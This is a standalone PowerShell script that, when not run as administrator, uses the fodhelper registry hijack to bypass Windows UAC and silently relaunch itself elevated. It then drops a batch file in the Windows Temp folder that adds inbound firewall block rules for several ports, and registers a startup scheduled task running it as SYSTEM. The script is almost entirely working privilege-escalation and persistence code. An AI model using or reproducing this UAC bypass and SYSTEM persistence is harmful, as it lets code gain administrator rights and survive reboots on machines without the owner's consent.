$CurrentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($CurrentIdentity)

if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[*] Not admin - attempting UAC bypass via fodhelper..." -ForegroundColor Yellow
    
    $RegPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    $Command = "powershell.exe -ExecutionPolicy Bypass -NoExit -File `"$PSCommandPath`""
    
    New-Item -Path $RegPath -Force | Out-Null
    New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $Command | Out-Null
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    
    Write-Host "[*] Elevated process launched. This window will close." -ForegroundColor Yellow
    Start-Sleep -Seconds 1
    exit
}

Write-Host "[+] Running as Administrator!" -ForegroundColor Green
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue

$PayloadPath = "$env:SystemRoot\Temp\lo_blocker.bat"
Write-Host "[*] Creating batch file at: $PayloadPath" -ForegroundColor Cyan

$BatchContent = @"
@echo off
netsh advfirewall firewall add rule name="LO_Block_TCP" dir=in action=block protocol=TCP localport=11796,796
netsh advfirewall firewall add rule name="LO_Block_UDP" dir=in action=block protocol=UDP localport=796,1053
"@

try {
    Set-Content -Path $PayloadPath -Value $BatchContent -Encoding ASCII -Force
    if (Test-Path $PayloadPath) {
        Write-Host "[+] Batch file created successfully!" -ForegroundColor Green
    } else {
        Write-Host "[-] Batch file creation failed!" -ForegroundColor Red
    }
} catch {
    Write-Host "[-] Error creating batch file: $_" -ForegroundColor Red
}

$TaskName = "SystemPortBlocker"
Write-Host "[*] Registering scheduled task: $TaskName" -ForegroundColor Cyan

try {
    $Action = New-ScheduledTaskAction -Execute $PayloadPath
    $Trigger = New-ScheduledTaskTrigger -AtStartup
    $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $TaskPrincipal -Settings $Settings -Force | Out-Null
    Write-Host "[+] Scheduled task registered successfully!" -ForegroundColor Green
} catch {
    Write-Host "[-] Error registering task: $_" -ForegroundColor Red
}

Write-Host "`n========== SUMMARY ==========" -ForegroundColor Magenta
Write-Host "Batch file: $PayloadPath" -ForegroundColor White
Write-Host "Task name:  $TaskName" -ForegroundColor White
Write-Host "Trigger:    At system startup" -ForegroundColor White
Write-Host "=============================" -ForegroundColor Magenta

Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
